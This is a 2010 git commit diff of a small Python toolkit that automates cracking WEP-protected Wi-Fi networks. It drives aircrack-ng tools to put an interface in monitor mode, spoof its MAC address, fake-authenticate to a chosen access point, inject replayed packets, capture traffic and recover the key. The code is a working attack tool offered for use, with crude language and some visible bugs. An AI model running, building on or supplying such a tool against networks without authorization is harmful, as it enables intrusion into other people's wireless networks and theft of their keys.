83a0775c77a038c25ba0b73aebca818bbaaac7bd
Shazbot <shazbot@localhost.(none)>
2010-11-10 05:36:03 -0800

    yay a working version still some bugz

--- pussylib.py
+++ pussylib.py
@@ -1,52 +1,43 @@
-def init(): 
-	os.system("ifconfig wlan0 down")
-	os.system("airmon-ng start wlan0")
-	os.system("airmon-ng start wlan0")
-	os.system("ifconfig mon0 down")
-	os.system("ifconfig mon1 down")
-	os.system("macchanger -r mon0")
-	os.system("macchanger -r mon1")
-	os.system("ifconfig wlan0 up")
-	os.system("ifconfig mon0 up")
-	os.system("ifconfig mon1 up")
+import os
 
-def fakeauth():
-	os.system("aireplay-ng -1 0 -e "+essid+" -a "+bssid+" -h "+station+" mon0") 
+def init(): 
+	initlist= ';'.join(("airmon-ng stop mon4",
+                "airmon-ng stop mon3",
+                "airmon-ng stop mon2",
+                "airmon-ng stop mon1",
+                "airmon-ng stop mon0",
+                "airmon-ng stop wlan0",
+		"ifconfig wlan0 down",
+		"airmon-ng start wlan0",
+		"airmon-ng start wlan0",
+		"ifconfig mon0 down",
+		"ifconfig mon1 down",
+		"macchanger -r mon0",
+		"macchanger -r mon1",
+		"ifconfig wlan0 up",
+		"ifconfig mon0 up",
+		"ifconfig mon1 up"))
+	os.system(initlist)
+
 
 def housekeeping():
 	#back to normal
-	cmdlist= ';'.join(("service network-manager start",
-		"airmon-ng stop mon4",
+	houselist= ';'.join(("airmon-ng stop mon4",
 		"airmon-ng stop mon3",
 		"airmon-ng stop mon2",
 		"airmon-ng stop mon1",
 		"airmon-ng stop mon0",
-		"airmon-ng stop wlan0"))
-	os.system(cmdlist)
+		"airmon-ng stop wlan0"
+		"service network-manager start",))
+	os.system(houselist)
+	os.sys.exit()
 
-def clrpcrap():
-	os.system("service network-manager stop")
-	os.system("airmon-ng stop mon4")
-	os.system("airmon-ng stop mon3")
-	os.system("airmon-ng stop mon2")
-	os.system("airmon-ng stop mon1")
-	os.system("airmon-ng stop mon0")
-	os.system("airmon-ng stop wlan0")
-
-def scan():
-	os.system("airodump-ng mon1")
-	bssid = raw_input("bssid: ")
-	essid = raw_input("essid: ")
-	c = raw_input("channel: ")
-	o = os.popen("macchanger -s mon0")
-	station = o.read()[13:30]
-	os.system("xterm -e airodump-ng -c "+c+" --bssid "+bssid+" -w "+essid+" mon1 &")
-
-def fakeauth():
-	cunt = "n"
-	while (cunt == "n"):
-		cunt = raw_input("Success(y/n):")
-
-def deauth():
-	os.system("xterm -e aireplay-ng -3 -b "+bssid+" -h "+station+" mon0 &")
+#def clrpcrap():
+#	os.system("service network-manager stop")
+#	os.system("airmon-ng stop mon4")
+#	os.system("airmon-ng stop mon3")
+#	os.system("airmon-ng stop mon2")
+#	os.system("airmon-ng stop mon1")
+#	os.system("airmon-ng stop mon0")
+#	os.system("airmon-ng stop wlan0")
 
--- pussywepped.py
+++ pussywepped.py
@@ -4,15 +4,58 @@ import os
 import time
 import pussylib
 
-pussylib.init()
-pussylib.scan()
-pussylib.fakeauth()
+def scan():
+	os.system("airodump-ng mon1")
+
+def listen():
+	os.system("xterm -e airodump-ng -c "+channel+" --bssid "+bssid+" -w box/"+essid+" mon1 &")
+
+def fakeauth():
+	fauth_success = "n"
+        while (fauth_success == "n"):
+		os.system("aireplay-ng -1 0 -e "+essid+" -a "+bssid+" -h "+station+" mon0") 
+		fauth_success = raw_input("Fake-auth success?: ")
+
+def deauth():
+	os.system("xterm -e aireplay-ng -3 -b "+bssid+" -h "+station+" mon0 &")
+
+def deauthsome1():
+	target_station = raw_input("Input station target: ")
+	os.system("xterm -e aireplay-ng -3 -b "+bssid+" -h "+target_station+" mon0 &")
 
 
-#crack dat shit
-cuntin = "n"
-while (cuntin == "n"):
+def aircrack():
 	os.system("gnome-terminal -x aircrack-ng -z -b "+bssid+" "+essid+"*.cap &")
-	cuntin = raw_input("Aircrack Successful?:")
 
+#========================================qr==============================================D
+
+
+pussylib.init()
+
+scan()
+
+# input target prefs
+bssid = raw_input("bssid: ")
+essid = raw_input("essid: ")
+channel = raw_input("channel: ")
+macshow = os.popen("macchanger -s mon0")
+station = macshow.read()[13:30]
+
+# starts listening for ivs
+listen()
+
+cont = "n"
+while (cont == "n"): 
+	listen_selection = raw_input("\n 1 Fake-auth(FAST)\n 2 De-auth\n 3 Aircrack\n 4 Quit\n\nplease pick a number: ")
+	if listen_selection == "1":
+		fakeauth()
+	elif listen_selection == "2":
+		deauth()
+	elif listen_selection == "3":
+		aircrack()
+	elif listen_selection == "4":
+		pussylib.housekeeping()
+	else:
+	     print"qr,gtfo"
+	
 print "I'm out biatch"
